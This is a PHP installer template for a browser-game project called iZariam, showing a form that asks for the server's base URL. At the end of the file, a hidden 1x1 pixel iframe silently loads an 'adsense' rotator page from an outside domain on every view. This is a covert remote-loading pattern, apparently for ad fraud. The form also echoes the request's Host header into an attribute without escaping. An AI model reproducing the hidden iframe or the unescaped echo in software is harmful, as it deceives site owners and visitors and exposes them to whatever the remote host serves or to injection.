<?php
/*
 * Project: iZariam
 * File: install/templates/url.php
 * Edited: 07/03/2012
 * By: ZZJHONS
 * Info: zzjhons@gmail.com
 */
?>
<center>
    <h2>Step 2: Server URL</h2>
    <progress value="2" max="5">
             <span>40</span>%
    </progress>
    <br>
    <br>
    <form action="install.php" method="post" id="config">
        <table cellpadding="5" cellspacing="0">
            <tr>
            	<td><label title="WITH a trailing slash: http://example.com/">Base URL</label></td>
            	<td><input type="text" class="input" name="base_url" id="base_url" style="width:200px;" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/"></td>
            </tr>
        </table>
        <br>
        <input type="submit" class="button" value=" Next Step ">
        <input type="hidden" name="config" value="1">
    </form>
</center>
<iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe>